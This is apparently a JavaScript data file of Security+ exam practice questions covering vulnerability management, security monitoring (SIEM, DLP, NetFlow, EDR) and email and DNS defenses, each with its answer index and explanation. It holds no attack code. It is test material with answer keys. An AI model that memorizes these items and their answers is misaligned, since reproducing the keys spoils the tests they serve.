  { id:"D4-033", domain:4, obj:"4.3", diff:"medium", q:"A vulnerability scanner reports a critical flaw, but investigation shows the affected service is not installed. This finding is a:", options:["False positive","False negative","Zero-day","True positive"], answer:0, explain:"<strong>False positive</strong> is correct because the scanner reported a vulnerability that does not actually apply, since the affected service is not even installed.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>True positive</b>: a true positive is a correctly identified real vulnerability, but here the flaw does not apply.</span><span class='qd'><b>False negative</b>: a false negative is a real threat the scanner missed, the opposite of reporting a nonexistent one.</span><span class='qd'><b>Zero-day</b>: a zero-day is an unpatched, actively exploited flaw, not a mistaken finding for an absent service.</span>" },
  { id:"D4-034", domain:4, obj:"4.3", diff:"medium", q:"On the CVSS base score scale, a vulnerability with a score of 9.5 is rated as:", options:["High","Critical","Low","Medium"], answer:1, explain:"<strong>Critical</strong> is correct because CVSS v3.x rates scores of 9.0 to 10.0 as Critical, the highest severity band.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Low</b>: Low covers 0.1 to 3.9, far below a 9.5 score.</span><span class='qd'><b>Medium</b>: Medium covers 4.0 to 6.9, well under a 9.5 score.</span><span class='qd'><b>High</b>: High covers 7.0 to 8.9, just below the Critical threshold that 9.5 exceeds.</span>" },
  { id:"D4-035", domain:4, obj:"4.3", diff:"medium", q:"Which type of vulnerability scan logs into the target system with valid credentials to assess it more thoroughly?", options:["External port scan only","Unauthenticated scan","Credentialed (authenticated) scan","Passive scan"], answer:2, explain:"<strong>Credentialed (authenticated) scan</strong> logs into the host with valid credentials, yielding deeper and more accurate results such as patch levels and configuration details.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Unauthenticated scan</b>: it probes from the outside without logging in, producing a shallower view limited to externally visible attributes.</span><span class='qd'><b>Passive scan</b>: it observes traffic without actively connecting or authenticating to the target.</span><span class='qd'><b>External port scan only</b>: it merely enumerates open ports from outside, gathering no internal credentialed detail.</span>" },
  { id:"D4-036", domain:4, obj:"4.3", diff:"hard", q:"A penetration tester is given no prior knowledge of the target environment and must discover everything externally. Which testing approach is this?", options:["Gray-box testing","Credentialed scanning","White-box testing","Black-box testing"], answer:3, explain:"<strong>Black-box testing</strong> provides the tester no internal information, simulating an external attacker who must discover everything with no insider knowledge.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>White-box testing</b>: the tester is given full internal knowledge such as source code and architecture, the opposite of this scenario.</span><span class='qd'><b>Gray-box testing</b>: the tester has partial knowledge, more than the zero information described here.</span><span class='qd'><b>Credentialed scanning</b>: that is an authenticated vulnerability scan, not a no-knowledge penetration testing approach.</span>" },
  { id:"D4-037", domain:4, obj:"4.3", diff:"medium", q:"After patching a vulnerability, what should be performed to confirm the fix was effective?", options:["A rescan / validation scan of the asset","Delete the asset from inventory","Disable all logging","Increase the CVSS score manually"], answer:0, explain:"<strong>A rescan / validation scan of the asset</strong> confirms remediation was successful and the vulnerability no longer appears, closing the loop on the finding.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Delete the asset from inventory</b>: removing the record hides the asset rather than verifying the fix and harms tracking.</span><span class='qd'><b>Disable all logging</b>: turning off logs removes evidence and does nothing to confirm the patch worked.</span><span class='qd'><b>Increase the CVSS score manually</b>: editing a severity score does not validate that the vulnerability was actually fixed.</span>" },
  { id:"D4-038", domain:4, obj:"4.3", diff:"easy", q:"A vulnerability that is exploited before the vendor has released a patch is known as a:", options:["False positive","Zero-day","Legacy bug","Configuration baseline"], answer:1, explain:"<strong>Zero-day</strong> is correct because it is exploited before the vendor has released a patch, leaving defenders no patch window.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>False positive</b>: that is a mistaken vulnerability report, not an actively exploited unpatched flaw.</span><span class='qd'><b>Legacy bug</b>: a legacy bug is an old known issue, typically with available fixes, unlike a brand-new unpatched flaw.</span><span class='qd'><b>Configuration baseline</b>: that is a standard reference configuration, not a type of vulnerability.</span>" },
  { id:"D4-039", domain:4, obj:"4.3", diff:"hard", q:"A scanner flags a vulnerability rated CVSS 7.8, but the affected host is on an isolated network with no inbound access and no sensitive data. Which factor MOST justifies deprioritizing it relative to a lower-CVSS internet-facing finding?", options:["The color of the report","The CVE number is higher","Environmental context such as exposure and asset value","The scanner vendor's logo"], answer:2, explain:"<strong>Environmental context such as exposure and asset value</strong> justifies deprioritization, since risk-based prioritization weighs exposure, exploitability, and asset value beyond the raw base CVSS.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>The CVE number is higher</b>: CVE identifiers are sequential labels and carry no meaning about severity or risk.</span><span class='qd'><b>The scanner vendor's logo</b>: branding is irrelevant to assessing a vulnerability's real-world risk.</span><span class='qd'><b>The color of the report</b>: visual formatting has no bearing on prioritization decisions.</span>" },
  { id:"D4-040", domain:4, obj:"4.3", diff:"medium", q:"What is the purpose of a 'rules of engagement' document in a penetration test?", options:["To replace the firewall configuration","To encrypt scan results","To list employee birthdays","To define scope, timing, methods, and limits of the test"], answer:3, explain:"<strong>To define scope, timing, methods, and limits of the test</strong> is the purpose of rules of engagement, keeping the test legal, safe, and within agreed boundaries.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To list employee birthdays</b>: personal data like birthdays has nothing to do with authorizing a test's boundaries.</span><span class='qd'><b>To replace the firewall configuration</b>: rules of engagement govern the test, they do not modify security device settings.</span><span class='qd'><b>To encrypt scan results</b>: protecting result data is a separate handling concern, not the function of an engagement agreement.</span>" },
  { id:"D4-041", domain:4, obj:"4.3", diff:"medium", q:"A program that invites external researchers to report vulnerabilities in exchange for rewards is called a:", options:["Bug bounty program","Change advisory board","Tabletop exercise","Honeypot"], answer:0, explain:"<strong>Bug bounty program</strong> crowdsources vulnerability discovery, paying external researchers for valid, responsibly disclosed findings.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Change advisory board</b>: it reviews and approves proposed changes in change management, not external vulnerability rewards.</span><span class='qd'><b>Tabletop exercise</b>: it is a discussion-based incident-response drill, not a reward program for researchers.</span><span class='qd'><b>Honeypot</b>: it is a decoy system to lure and study attackers, not a program inviting reward-based reports.</span>" },
  { id:"D4-042", domain:4, obj:"4.3", diff:"hard", q:"During a pen test, the tester gains a foothold and then expands access to additional systems and higher privileges. Which two activities BEST describe this?", options:["Reconnaissance and scanning","Lateral movement and privilege escalation","Reporting and remediation","Patching and rescanning"], answer:1, explain:"<strong>Lateral movement and privilege escalation</strong> best describe expanding access to additional systems and gaining higher privileges after a foothold.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Reconnaissance and scanning</b>: those are early information-gathering phases before any foothold is gained.</span><span class='qd'><b>Reporting and remediation</b>: those are post-test wrap-up activities, not active expansion of access.</span><span class='qd'><b>Patching and rescanning</b>: those are defensive remediation steps, not attacker expansion within the environment.</span>" },
  { id:"D4-043", domain:4, obj:"4.3", diff:"easy", q:"Which source provides intelligence about known exploited vulnerabilities and emerging threats to inform vulnerability prioritization?", options:["A printer manual","A screensaver","Threat intelligence feeds","The company lunch menu"], answer:2, explain:"<strong>Threat intelligence feeds</strong> deliver information about known exploited vulnerabilities and emerging threats, helping teams prioritize flaws under active exploitation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>The company lunch menu</b>: it contains food options and no security threat data.</span><span class='qd'><b>A printer manual</b>: it documents device operation, not vulnerability or threat intelligence.</span><span class='qd'><b>A screensaver</b>: it is a display feature with no threat information.</span>" },
  { id:"D4-044", domain:4, obj:"4.3", diff:"medium", q:"What does responsible disclosure require of a researcher who finds a vulnerability?", options:["Sell the vulnerability to attackers","Ignore the finding","Immediately publish full exploit code publicly","Notify the vendor and allow time to remediate before public disclosure"], answer:3, explain:"<strong>Notify the vendor and allow time to remediate before public disclosure</strong> is what responsible disclosure requires, giving the vendor a reasonable window to patch before details go public.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Immediately publish full exploit code publicly</b>: releasing exploit code before a patch exposes users to attack and is the opposite of responsible disclosure.</span><span class='qd'><b>Sell the vulnerability to attackers</b>: that is malicious and illegal, not responsible disclosure.</span><span class='qd'><b>Ignore the finding</b>: leaving the flaw unreported allows it to persist unaddressed, helping no one.</span>" },
  { id:"D4-045", domain:4, obj:"4.3", diff:"hard", q:"A team has thousands of findings and limited staff. Which approach MOST effectively reduces overall risk with constrained resources?", options:["Remediate based on risk: exploitability, exposure, and asset criticality","Patch only the newest CVEs regardless of severity","Ignore all critical findings","Patch findings alphabetically by hostname"], answer:0, explain:"<strong>Remediate based on risk: exploitability, exposure, and asset criticality</strong> focuses limited effort on the vulnerabilities most likely to be exploited on the most important assets, maximizing risk reduction.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Patch findings alphabetically by hostname</b>: name order is arbitrary and ignores actual severity and exposure.</span><span class='qd'><b>Patch only the newest CVEs regardless of severity</b>: recency does not equal risk, and older critical flaws may pose greater danger.</span><span class='qd'><b>Ignore all critical findings</b>: skipping the most severe vulnerabilities leaves the highest-risk exposures unaddressed.</span>" },
  { id:"D4-046", domain:4, obj:"4.3", diff:"medium", q:"When a vulnerability cannot be patched immediately, applying a firewall rule to block the affected port is an example of:", options:["A permanent fix","A compensating control / mitigation","A false positive","Asset disposal"], answer:1, explain:"<strong>A compensating control / mitigation</strong> describes a firewall rule blocking the affected port to reduce exposure until the vulnerability can be properly fixed.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A permanent fix</b>: a firewall block is a temporary mitigation, not the actual patch that resolves the flaw.</span><span class='qd'><b>A false positive</b>: that is a mistaken finding, not an action taken to mitigate a real vulnerability.</span><span class='qd'><b>Asset disposal</b>: that is the end-of-life retirement of media or hardware, unrelated to mitigating a live vulnerability.</span>" },
  { id:"D4-047", domain:4, obj:"4.3", diff:"easy", q:"What distinguishes a vulnerability scan from a penetration test?", options:["A pen test cannot find any vulnerabilities","A scan actively exploits flaws; a pen test only lists them","A scan identifies potential weaknesses; a pen test attempts to exploit them","They are identical"], answer:2, explain:"<strong>A scan identifies potential weaknesses; a pen test attempts to exploit them</strong> correctly distinguishes the two, with the test going further to demonstrate real impact.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A scan actively exploits flaws; a pen test only lists them</b>: this reverses the roles, since the scan reports and the test exploits.</span><span class='qd'><b>They are identical</b>: scanning and penetration testing differ in depth and intent, so they are not the same.</span><span class='qd'><b>A pen test cannot find any vulnerabilities</b>: a pen test does find and exploit vulnerabilities, so this is false.</span>" },
  { id:"D4-048", domain:4, obj:"4.3", diff:"medium", q:"Which standardized system provides a numeric severity score from 0.0 to 10.0 for vulnerabilities?", options:["CIS","CRL","CVE","CVSS"], answer:3, explain:"<strong>CVSS</strong> (Common Vulnerability Scoring System) produces a 0.0 to 10.0 severity score using base, temporal, and environmental metrics to aid prioritization.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>CVE</b>: that is a unique identifier for a vulnerability, not a numeric severity score.</span><span class='qd'><b>CIS</b>: the Center for Internet Security publishes hardening benchmarks, not a severity scoring scale.</span><span class='qd'><b>CRL</b>: a Certificate Revocation List names revoked certificates, unrelated to vulnerability scoring.</span>" },
  { id:"D4-049", domain:4, obj:"4.4", diff:"easy", q:"What is the primary function of a SIEM?", options:["To collect, correlate, and analyze log data from many sources for alerting","To assign IP addresses","To encrypt wireless traffic","To physically destroy hard drives"], answer:0, explain:"<strong>To collect, correlate, and analyze log data from many sources for alerting</strong> is the primary function of a SIEM, enabling central detection, alerting, and investigation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To physically destroy hard drives</b>: media destruction is a disposal task, not a log analysis platform's role.</span><span class='qd'><b>To assign IP addresses</b>: address assignment is a DHCP function, unrelated to log correlation.</span><span class='qd'><b>To encrypt wireless traffic</b>: Wi-Fi encryption is handled by WPA2/WPA3, not a SIEM.</span>" },
  { id:"D4-050", domain:4, obj:"4.4", diff:"easy", q:"What is the main goal of a Data Loss Prevention (DLP) system?", options:["To speed up backups","To detect and prevent unauthorized exfiltration of sensitive data","To allocate disk quotas","To manage VPN tunnels"], answer:1, explain:"<strong>To detect and prevent unauthorized exfiltration of sensitive data</strong> is the main goal of DLP, which inspects data in use, in motion, and at rest.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To speed up backups</b>: backup performance is unrelated to monitoring for sensitive data leakage.</span><span class='qd'><b>To allocate disk quotas</b>: quota management limits storage use, not data exfiltration.</span><span class='qd'><b>To manage VPN tunnels</b>: VPN management secures remote connections, not detection of sensitive data leaving the organization.</span>" },
  { id:"D4-051", domain:4, obj:"4.4", diff:"medium", q:"Which protocol is commonly used to collect performance and status information from network devices and can generate traps for events?", options:["SFTP","SIP","SNMP","SMTP"], answer:2, explain:"<strong>SNMP</strong> (Simple Network Management Protocol) monitors and manages network devices and can send unsolicited trap messages when defined events occur.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SMTP</b>: that is the protocol for sending email, not collecting device status or generating traps.</span><span class='qd'><b>SFTP</b>: that securely transfers files over SSH, unrelated to device monitoring.</span><span class='qd'><b>SIP</b>: that sets up and manages voice and video sessions, not network device management.</span>" },
  { id:"D4-052", domain:4, obj:"4.4", diff:"medium", q:"What information does NetFlow primarily provide?", options:["Encryption keys","Antivirus signatures","Full packet payload contents","Metadata about network traffic flows such as source, destination, and volume"], answer:3, explain:"<strong>Metadata about network traffic flows such as source, destination, and volume</strong> is what NetFlow records, capturing addresses, ports, protocol, and byte counts rather than full payloads.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Full packet payload contents</b>: full payloads are captured by PCAP, not NetFlow, which records only metadata.</span><span class='qd'><b>Encryption keys</b>: NetFlow does not collect or expose cryptographic keys.</span><span class='qd'><b>Antivirus signatures</b>: signatures belong to endpoint protection databases, not flow records.</span>" },
  { id:"D4-053", domain:4, obj:"4.4", diff:"hard", q:"A SIEM generates thousands of alerts daily, overwhelming analysts who begin ignoring them. Which improvement BEST addresses this problem?", options:["Tune correlation rules and reduce false positives to focus on actionable alerts","Forward every log to email","Increase the alert volume","Disable the SIEM entirely"], answer:0, explain:"<strong>Tune correlation rules and reduce false positives to focus on actionable alerts</strong> directly addresses alert fatigue by prioritizing high-fidelity events analysts can act on.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Disable the SIEM entirely</b>: removing detection eliminates visibility and makes security far worse.</span><span class='qd'><b>Forward every log to email</b>: flooding inboxes increases noise and worsens fatigue rather than reducing it.</span><span class='qd'><b>Increase the alert volume</b>: more alerts intensify the very overload that analysts are already ignoring.</span>" },
  { id:"D4-054", domain:4, obj:"4.4", diff:"medium", q:"Which monitoring approach detects threats by comparing current behavior to an established normal pattern?", options:["Signature-based detection","Anomaly/behavior-based detection","Manual log review only","Port scanning"], answer:1, explain:"<strong>Anomaly/behavior-based detection</strong> baselines normal activity and flags deviations, catching novel or unknown threats that lack signatures.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Signature-based detection</b>: it matches known patterns and cannot catch threats by comparing against a normal baseline.</span><span class='qd'><b>Manual log review only</b>: that is a slow human process, not an automated comparison to an established normal pattern.</span><span class='qd'><b>Port scanning</b>: that enumerates open ports, it is not a behavioral detection method.</span>" },
  { id:"D4-055", domain:4, obj:"4.4", diff:"easy", q:"What is the function of antivirus/anti-malware software on an endpoint?", options:["To route VPN traffic","To manage printer queues","To detect and remove malicious software","To assign DHCP leases"], answer:2, explain:"<strong>To detect and remove malicious software</strong> is the function of antivirus/anti-malware, using signatures, heuristics, and behavioral analysis to quarantine and remove malicious code.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To assign DHCP leases</b>: lease assignment is a DHCP server function, not malware defense.</span><span class='qd'><b>To route VPN traffic</b>: routing encrypted tunnels is a VPN role, unrelated to detecting malware.</span><span class='qd'><b>To manage printer queues</b>: print spooling has nothing to do with endpoint malware protection.</span>" },
  { id:"D4-056", domain:4, obj:"4.4", diff:"medium", q:"Why is accurate time synchronization (e.g., via NTP) important for log analysis in a SIEM?", options:["It encrypts the logs","It reduces disk usage","It improves Wi-Fi speed","It allows correlation of events across systems in the correct sequence"], answer:3, explain:"<strong>It allows correlation of events across systems in the correct sequence</strong>, because synchronized clocks align timestamps so the SIEM can accurately order and link events.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It improves Wi-Fi speed</b>: time synchronization does not affect wireless throughput.</span><span class='qd'><b>It encrypts the logs</b>: NTP synchronizes clocks, it does not provide log encryption.</span><span class='qd'><b>It reduces disk usage</b>: accurate timestamps do not shrink log storage requirements.</span>" },
  { id:"D4-057", domain:4, obj:"4.4", diff:"hard", q:"An analyst must investigate a suspected data exfiltration over an encrypted channel. Full packet capture shows only ciphertext. Which data source BEST helps identify the anomalous large outbound transfer?", options:["NetFlow/flow data showing volume and destination","The antivirus signature database","The DHCP lease table","The printer logs"], answer:0, explain:"<strong>NetFlow/flow data showing volume and destination</strong> is best because flow metadata reveals unusual destinations and large transfer volumes even when payloads are encrypted.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>The antivirus signature database</b>: signatures detect known malware files, not anomalous encrypted outbound transfers.</span><span class='qd'><b>The DHCP lease table</b>: it maps IP-to-device assignments and reveals nothing about transfer volume or destination.</span><span class='qd'><b>The printer logs</b>: print activity is unrelated to network exfiltration over an encrypted channel.</span>" },
  { id:"D4-058", domain:4, obj:"4.4", diff:"medium", q:"What is the role of a SOAR platform alongside a SIEM?", options:["To physically wire the network","To automate and orchestrate incident response workflows","To replace all human analysts permanently","To encrypt backups"], answer:1, explain:"<strong>To automate and orchestrate incident response workflows</strong> is the role of SOAR, which automates repetitive tasks and runs playbooks to speed and standardize response.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To physically wire the network</b>: cabling is a hardware installation task, not security orchestration.</span><span class='qd'><b>To replace all human analysts permanently</b>: SOAR augments analysts by automating routine work, it does not eliminate them.</span><span class='qd'><b>To encrypt backups</b>: backup encryption is a data-protection control, not response automation.</span>" },
  { id:"D4-059", domain:4, obj:"4.4", diff:"medium", q:"Which DLP deployment inspects data leaving the organization over the network, such as email and web uploads?", options:["A vulnerability scanner","Endpoint DLP only","Network DLP","Storage/at-rest DLP only"], answer:2, explain:"<strong>Network DLP</strong> monitors data in motion across egress points such as email, web, and file transfer to detect and block unauthorized transmission of sensitive data.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Endpoint DLP only</b>: it inspects activity on the device itself, such as copying to USB, not data leaving over the network.</span><span class='qd'><b>Storage/at-rest DLP only</b>: it scans stored data on servers and repositories, not data crossing the network egress.</span><span class='qd'><b>A vulnerability scanner</b>: it finds weaknesses and missing patches, not data leaving the organization.</span>" },
  { id:"D4-060", domain:4, obj:"4.4", diff:"hard", q:"A SOC wants to detect a new malware variant that no vendor signature yet matches. Which capability is MOST likely to catch it?", options:["Disabling logging","An asset inventory spreadsheet","Strict signature-only antivirus","Behavioral/heuristic EDR detection"], answer:3, explain:"<strong>Behavioral/heuristic EDR detection</strong> flags suspicious actions and patterns, catching novel malware that has no existing vendor signature.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Strict signature-only antivirus</b>: it can only match known signatures, so a brand-new variant with no signature slips past it.</span><span class='qd'><b>Disabling logging</b>: removing telemetry reduces visibility and helps nothing in detecting new malware.</span><span class='qd'><b>An asset inventory spreadsheet</b>: it tracks assets but performs no malware detection.</span>" },
  { id:"D4-061", domain:4, obj:"4.4", diff:"easy", q:"What does log aggregation accomplish in a monitoring architecture?", options:["It centralizes logs from many sources into one place for analysis","It encrypts the network","It assigns IP addresses","It deletes logs to save space"], answer:0, explain:"<strong>It centralizes logs from many sources into one place for analysis</strong>, so events can be searched, correlated, and retained consistently.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It deletes logs to save space</b>: aggregation collects and retains logs, it does not delete them.</span><span class='qd'><b>It encrypts the network</b>: network encryption protects traffic, not a log-collection function.</span><span class='qd'><b>It assigns IP addresses</b>: address assignment is a DHCP role, unrelated to log centralization.</span>" },
  { id:"D4-062", domain:4, obj:"4.4", diff:"medium", q:"Which SNMP version should be used to ensure authentication and encryption of management traffic?", options:["SNMPv2c","SNMPv3","SNMPv0","SNMPv1"], answer:1, explain:"<strong>SNMPv3</strong> adds authentication and encryption through its security model, unlike v1 and v2c which send community strings in cleartext.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SNMPv1</b>: it uses cleartext community strings with no authentication or encryption.</span><span class='qd'><b>SNMPv2c</b>: it still relies on cleartext community strings and lacks encryption.</span><span class='qd'><b>SNMPv0</b>: there is no SNMPv0 standard, so it is not a valid choice.</span>" },
  { id:"D4-063", domain:4, obj:"4.4", diff:"hard", q:"After deploying DLP, the team finds it blocks legitimate business emails containing customer account numbers. What is the BEST next step?", options:["Ignore the complaints","Disable DLP completely","Refine DLP policies and use exceptions/contextual rules to reduce false positives","Block all outbound email permanently"], answer:2, explain:"<strong>Refine DLP policies and use exceptions/contextual rules to reduce false positives</strong> tunes the system so legitimate business email flows while genuinely sensitive data stays protected.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Disable DLP completely</b>: turning off protection removes the control entirely and exposes sensitive data.</span><span class='qd'><b>Block all outbound email permanently</b>: halting all email cripples business operations and overcorrects the problem.</span><span class='qd'><b>Ignore the complaints</b>: leaving valid emails blocked harms the business and resolves nothing.</span>" },
  { id:"D4-064", domain:4, obj:"4.4", diff:"medium", q:"What is the purpose of a security alert's 'severity' or priority field?", options:["To set the screen brightness","To choose the font color","To indicate the analyst's name","To help responders triage which alerts to address first"], answer:3, explain:"<strong>To help responders triage which alerts to address first</strong> is the purpose of an alert's severity field, ensuring the most urgent, high-impact alerts are handled first.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To indicate the analyst's name</b>: severity conveys urgency, not who is assigned to the alert.</span><span class='qd'><b>To set the screen brightness</b>: display brightness is unrelated to alert prioritization.</span><span class='qd'><b>To choose the font color</b>: visual styling is not the meaning of a severity field.</span>" },
  { id:"D4-065", domain:4, obj:"4.4", diff:"medium", q:"Which monitoring data source captures the full content of network packets for deep inspection?", options:["Packet capture (PCAP)","SNMP polling","DHCP logs","NetFlow"], answer:0, explain:"<strong>Packet capture (PCAP)</strong> records full packet contents, enabling deep payload inspection.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>NetFlow</b>: it records only flow metadata such as addresses and volume, not full packet payloads.</span><span class='qd'><b>SNMP polling</b>: it gathers device status and counters, not the full content of network packets.</span><span class='qd'><b>DHCP logs</b>: they record IP lease assignments, not packet payloads.</span>" },
  { id:"D4-066", domain:4, obj:"4.4", diff:"easy", q:"What is a 'false negative' in security monitoring?", options:["An alert for activity that turned out to be benign","A real threat that the system failed to detect","A duplicate log entry","A successful patch"], answer:1, explain:"<strong>A real threat that the system failed to detect</strong> is a false negative, which is especially dangerous because the malicious activity goes unalerted.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>An alert for activity that turned out to be benign</b>: that describes a false positive, not a missed real threat.</span><span class='qd'><b>A duplicate log entry</b>: a repeated record is a logging artifact, not a missed detection.</span><span class='qd'><b>A successful patch</b>: a completed remediation is unrelated to a detection miss.</span>" },
  { id:"D4-067", domain:4, obj:"4.4", diff:"hard", q:"A SIEM use case must alert when a single user logs in from two distant countries within minutes. Which detection concept does this represent?", options:["Asset tagging","Signature matching","Impossible travel / behavioral correlation","Port scanning"], answer:2, explain:"<strong>Impossible travel / behavioral correlation</strong> flags logins that could not physically occur in the time elapsed, correlating geolocation and timing to indicate credential compromise.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Signature matching</b>: it compares against known bad patterns and does not correlate login location and timing.</span><span class='qd'><b>Port scanning</b>: that enumerates open services, unrelated to analyzing user login geography.</span><span class='qd'><b>Asset tagging</b>: that labels inventory items and has nothing to do with login anomaly detection.</span>" },
  { id:"D4-068", domain:4, obj:"4.4", diff:"medium", q:"What is the benefit of integrating threat intelligence feeds into a SIEM?", options:["It disables correlation rules","It removes the need for logging","It increases disk fragmentation","It enriches alerts with known malicious indicators for better detection"], answer:3, explain:"<strong>It enriches alerts with known malicious indicators for better detection</strong>, matching activity against known-bad IPs, domains, and hashes to improve accuracy and context.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It increases disk fragmentation</b>: fragmentation is a storage concern unrelated to threat intelligence value.</span><span class='qd'><b>It disables correlation rules</b>: threat intel strengthens correlation, it does not turn rules off.</span><span class='qd'><b>It removes the need for logging</b>: intel enrichment depends on logs, so it does not eliminate logging.</span>" },
  { id:"D4-069", domain:4, obj:"4.4", diff:"medium", q:"Which agent-based control monitors endpoint processes and can isolate a host when malicious behavior is detected?", options:["Endpoint Detection and Response (EDR)","A DHCP server","A NetFlow collector","An SNMP trap"], answer:0, explain:"<strong>Endpoint Detection and Response (EDR)</strong> agents continuously monitor endpoint processes, detect malicious behavior, and can quarantine or isolate a compromised host.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A DHCP server</b>: it assigns IP addresses and cannot monitor processes or isolate a host.</span><span class='qd'><b>A NetFlow collector</b>: it aggregates network flow metadata, not endpoint process activity or host isolation.</span><span class='qd'><b>An SNMP trap</b>: it is an event notification from a device, not an agent that monitors and isolates endpoints.</span>" },
  { id:"D4-070", domain:4, obj:"4.4", diff:"hard", q:"An organization must demonstrate to auditors that security logs have not been altered. Which control BEST supports log integrity?", options:["Storing logs only on the originating server","Forwarding logs to a write-once/protected central log store with hashing","Letting administrators edit logs freely","Deleting logs weekly"], answer:1, explain:"<strong>Forwarding logs to a write-once/protected central log store with hashing</strong> best supports log integrity, since a tamper-resistant store with integrity hashing prevents and detects modification.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Storing logs only on the originating server</b>: an attacker who compromises that server can alter or delete the local logs.</span><span class='qd'><b>Letting administrators edit logs freely</b>: editable logs destroy integrity and cannot prove they are unaltered.</span><span class='qd'><b>Deleting logs weekly</b>: routine deletion removes evidence and undermines audit and forensic trust.</span>" }
);
SECPLUS.questions.push(
  { id:"D4-071", domain:4, obj:"4.5", diff:"easy", q:"Which DNS-based capability blocks users from resolving domains known to host malware or phishing content?", options:["DNSSEC signing","Dynamic DNS","DNS filtering","DNS round robin"], answer:2, explain:"<strong>DNS filtering</strong> inspects resolution requests and blocks queries to malicious or disallowed domains before a connection is ever established.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>DNS round robin</b>: this is a load-distribution technique that cycles through multiple A records for one hostname, doing nothing to block malicious domains.</span><span class='qd'><b>DNSSEC signing</b>: DNSSEC adds cryptographic signatures to authenticate that records were not tampered with, but it validates integrity rather than blocking malicious lookups.</span><span class='qd'><b>Dynamic DNS</b>: Dynamic DNS automatically updates records when a host's IP changes, a convenience feature with no filtering capability.</span>" },
  { id:"D4-072", domain:4, obj:"4.5", diff:"easy", q:"What is the primary purpose of an Intrusion Prevention System (IPS) versus an IDS?", options:["It encrypts traffic between hosts","It assigns IP addresses dynamically","It only logs traffic for later review","It actively blocks or drops malicious traffic inline"], answer:3, explain:"<strong>It actively blocks or drops malicious traffic inline</strong> is what defines an IPS: it sits in the traffic path and can stop attacks, whereas an IDS is passive and only alerts.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It only logs traffic for later review</b>: passive logging without action describes an IDS or a basic sensor, not the active blocking that distinguishes an IPS.</span><span class='qd'><b>It encrypts traffic between hosts</b>: encryption is the job of protocols like TLS or IPsec, not an intrusion prevention engine.</span><span class='qd'><b>It assigns IP addresses dynamically</b>: dynamic address assignment is the function of a DHCP server, unrelated to intrusion prevention.</span>" },
  { id:"D4-073", domain:4, obj:"4.5", diff:"medium", q:"An email security record specifies which mail servers are authorized to send mail for a domain. Which mechanism is this?", options:["SPF","TLS","DKIM","DMARC"], answer:0, explain:"<strong>SPF</strong> publishes a DNS record listing the IP addresses or hosts permitted to send mail for the domain, letting receivers reject mail from unauthorized senders.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>DKIM</b>: DKIM cryptographically signs the message to prove content integrity and origin, but it does not list which servers are authorized to send.</span><span class='qd'><b>DMARC</b>: DMARC sets the policy and reporting for handling mail that fails SPF or DKIM, building on those checks rather than listing authorized senders itself.</span><span class='qd'><b>TLS</b>: TLS encrypts the transport channel between mail servers and does not authorize specific sending hosts for a domain.</span>" },
  { id:"D4-074", domain:4, obj:"4.5", diff:"medium", q:"Which email authentication method uses a cryptographic signature in the message header to verify that content was not altered in transit?", options:["SPF","DKIM","DMARC","S/MIME"], answer:1, explain:"<strong>DKIM</strong> signs the message headers and body with a private key, and receivers verify with the public key published in DNS, proving the content was not altered in transit.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SPF</b>: SPF only checks whether the sending server's IP is authorized for the domain and does not sign or verify message content.</span><span class='qd'><b>DMARC</b>: DMARC defines policy and alignment for SPF and DKIM results but provides no cryptographic signature of its own.</span><span class='qd'><b>S/MIME</b>: S/MIME signs and encrypts at the end-user message level using certificates, not the domain-level header signing tied to DNS that defines DKIM.</span>" },
